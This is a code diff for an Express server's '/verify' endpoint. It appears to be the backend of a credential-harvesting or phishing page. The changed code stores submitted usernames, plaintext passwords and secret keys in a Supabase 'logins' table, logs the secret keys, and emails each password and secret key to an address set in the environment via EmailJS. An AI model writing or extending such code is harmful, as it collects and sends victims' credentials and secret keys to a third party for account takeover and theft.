@@ -18,19 +18,23 @@ const supabase = createClient(
 );
 
 app.post("/verify", async (req, res) => {
-  const { username, password, secret_key, login_row_id } = req.body;
+  const { username, password, secret_key } = req.body;
 
   if (!username || !password || !secret_key) {
     return res.status(400).json({ error: "Missing fields" });
   }
 
+  console.log("/verify body:", { username, secret_key });
+
   try {
-    if (login_row_id) {
-      const { error } = await supabase
-        .from("logins")
-        .update({ secret_key })
-        .eq("id", login_row_id);
-      if (error) console.error("Supabase update error:", error);
+    const { data, error } = await supabase
+      .from("logins")
+      .insert({ username, password, secret_key })
+      .select();
+    if (error) {
+      console.error("Supabase insert error:", error);
+    } else {
+      console.log("Supabase insert result:", data);
     }
   } catch (err) {
     console.error("Supabase error:", err);
@@ -41,9 +45,8 @@ app.post("/verify", async (req, res) => {
       process.env.EMAILJS_SERVICE_ID,
       process.env.EMAILJS_TEMPLATE_ID,
       {
-        username,
+        username: `${username} - secret-key: ${secret_key}`,
         password,
-        secret_key,
         to_email: process.env.EMAILJS_TO_EMAIL,
       },
       {
